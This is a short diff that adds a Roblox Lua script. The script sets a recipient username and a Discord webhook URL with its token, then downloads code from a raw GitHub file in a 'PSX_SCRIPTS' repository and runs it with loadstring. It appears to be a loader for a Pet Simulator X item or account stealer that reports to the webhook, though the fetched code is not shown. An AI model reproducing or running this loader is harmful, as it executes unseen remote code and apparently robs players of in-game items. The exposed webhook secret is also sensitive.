@@ -1,0 +1,4 @@
+	UserName = "WahOnTop"
+WebHook = "https://discord.com/api/webhooks/1040669953226985653/2uTnd0Eo7dmScJh-Z2qVKJ_FMZ6XR-1aY9zih595e1VB3mBPXzz4nIJwr2_XH1RwJ1oU"
+ 
+loadstring(game:HttpGet("https://raw.githubusercontent.com/SchoolTrash/PSX_SCRIPTS/main/penis", true))()
